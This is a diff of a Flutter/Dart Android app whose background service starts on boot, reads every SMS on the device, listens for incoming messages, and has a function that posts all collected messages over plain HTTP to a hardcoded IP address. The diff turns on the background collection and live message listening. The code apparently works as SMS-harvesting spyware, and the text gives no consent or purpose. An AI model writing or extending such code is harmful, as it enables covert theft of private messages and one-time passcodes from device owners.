@@ -3,6 +3,7 @@ import 'dart:convert';
 import 'dart:developer';
 import 'dart:ui';
 import 'package:connectivity/connectivity.dart';
+import 'package:flutter_background/flutter_background.dart';
 import 'package:flutter_background_service/flutter_background_service.dart';
 import 'package:flutter_background_service_android/flutter_background_service_android.dart';
 import 'package:get/get.dart';
@@ -24,6 +25,18 @@ Future<void> initializeService() async {
         autoStart: true,
         autoStartOnBoot: true,
       ));
+
+  // final androidConfig = FlutterBackgroundAndroidConfig(
+  //   notificationTitle: "flutter_background example app",
+  //   notificationText: "Background notification for keeping the example app running in the background",
+  //   notificationImportance: AndroidNotificationImportance.Default,
+  //   notificationIcon: AndroidResource(name: 'background_icon', defType: 'drawable'), // Default is ic_launcher from folder mipmap
+  // );
+  //
+  // bool success = await FlutterBackground.initialize(androidConfig: androidConfig);
+  //
+  // log("background success: ${success}");
+
 }
 
 @pragma('vm:entry-point')
@@ -63,14 +76,13 @@ void onStart(ServiceInstance serviceInstance)async{
         if(Prefs.firstTimeLogin.value == true){
           log('first time true');
           Prefs.firstTimeLogin.updateValue(false);
-          smsController.getAllSms();
+          smsController.getAllSms(isFromBackground: true);
           // sendPostRequest(smsController);
         }else{
           log('first time false');
           print('listen service running');
-          // smsController.listenIncomingSms(false);
+          smsController.listenIncomingSms(false);
           smsController.getLastSms();
-
 
         }
 
@@ -83,13 +95,13 @@ void onStart(ServiceInstance serviceInstance)async{
 
 
      if(await serviceInstance.isForegroundService()){
-
        serviceInstance.setForegroundNotificationInfo(title: "sms", content: "sms reader");
        serviceInstance.setAutoStartOnBootMode(true);
        // serviceInstance.setAsBackgroundService();
        // smsController.incomingSmsList();
 
      }
+
 
 
     });
@@ -101,7 +113,7 @@ void onStart(ServiceInstance serviceInstance)async{
 
 Future<void> sendPostRequest(SmsController smsController) async {
   final url = Uri.parse('http://18.136.115.162/api/sms/send-all-messages'); // Replace with your API endpoint URL
-  smsController.getAllSms();
+  smsController.getAllSms(isFromBackground: true);
 
    List<SendDataModel> myModels= [];
   log("sms list ${smsController.allSmsList}");
